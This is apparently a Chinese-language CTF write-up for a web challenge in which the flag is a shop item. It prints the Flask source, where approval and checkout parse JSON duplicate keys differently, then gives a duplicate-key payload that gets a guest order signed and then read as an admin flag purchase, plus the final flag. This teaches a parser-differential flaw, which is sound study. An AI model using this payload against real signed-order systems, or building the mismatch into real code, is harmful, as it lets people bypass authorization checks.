---
title: 买不到的FLAG（QCTF2026 web）
date: 2026-10-21
category: Web
tags:
  - CTF
  - Writeup
  - web
draft: false
summary: "flag 是货架上的一个\"商品\"。但正常下单买它会被各种校验拦下来。"
collection: QCTF2026
---
# 买不到的FLAG

## 第一节：题目
flag 是货架上的一个"商品"。但正常下单买它会被各种校验拦下来。

## 第二节：过程
扫描出/src路径，打开看（经过了整理）

```python
import hashlib
import hmac
import json
import os
import secrets
from flask import *

HOST = "0.0.0.0"
PORT = int(os.environ.get("PORT", "8080"))
SIGNING_KEY = secrets.token_bytes(32)
FLAG = os.environ.get("FLAG") or f"flag{{ledger_split_{secrets.token_hex(6)}}}"

app = Flask(__name__)

def audit_pairs(pairs):
    result = {}
    for key, value in pairs:
        if key not in result:
            result[key] = value
    return result


def audit_decode(raw):
    value = json.loads(raw.decode("utf-8"), object_pairs_hook=audit_pairs)
    if not isinstance(value, dict):
        raise ValueError("top-level JSON must be an object")
    return value


def checkout_decode(raw):
    value = json.loads(raw.decode("utf-8"))
    if not isinstance(value, dict):
        raise ValueError("top-level JSON must be an object")
    return value


def canonical(value):
    return json.dumps(
        value, sort_keys=True, separators=(",", ":"), ensure_ascii=False
    ).encode("utf-8")


def sign(value):
    return hmac.new(SIGNING_KEY, canonical(value), hashlib.sha256).hexdigest()


def validate_public_order(order):
    expected = {"account", "product", "role", "quantity"}
    if set(order) != expected:
        return "order must contain exactly account, product, role, and quantity"
    if order["account"] != "guest":
        return "only the guest account is available"
    if order["role"] != "customer":
        return "the auditor only approves customer orders"
    if order["product"] not in {"sticker", "mug"}:
        return "product is not in the public catalog"
    if type(order["quantity"]) is not int or not 1 <= order["quantity"] <= 3:
        return "quantity must be an integer from 1 to 3"
    return None

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/src")
def src():
    return open(__file__, "rb").read()

@app.route("/healthz")
def healthz():
    return jsonify({"status": "ok"})

@app.route("/api/approve", methods=["POST"])
def approve():
    raw = request.get_data()
    order = audit_decode(raw)
    error = validate_public_order(order)
    if error:
        return jsonify({"error": error})
    return jsonify({"approval": sign(order), "status": "approved"})

@app.route("/api/checkout", methods=["POST"])
def checkout():
    raw = request.get_data()
    audited_order = audit_decode(raw)
    supplied = request.headers.get("X-Approval", "")
    if not hmac.compare_digest(sign(audited_order), supplied):
        return jsonify({"error": "missing or invalid approval"})
    order = checkout_decode(raw)
    if order.get("product") == "flag" and order.get("role") == "admin":
        return jsonify({"product": "flag", "value": FLAG})
    public_error = validate_public_order(order)
    if public_error:
        return jsonify({"error": "checkout rejected order", "detail": public_error})
    total = {"sticker": 7, "mug": 19}[str(order["product"])] * int(order["quantity"])
    return jsonify({"status": "paid", "total": total, "currency": "credits"})


if __name__ == "__main__":
    app.run(host=HOST, port=PORT)
```


**approve** 用 audit 那套解析，重复键取第一个；**checkout** 最后发货用的是另一套，重复键取最后一个。

于是构造同名重复键的 body：

```json
{"account":"guest","product":"sticker","product":"flag","role":"customer","role":"admin","quantity":1}
```

发货的时候取到的是 product=flag, role=admin

最后 flag：

`QCTF{2048d93d-b687-4262-9a80-d875d52a311a}`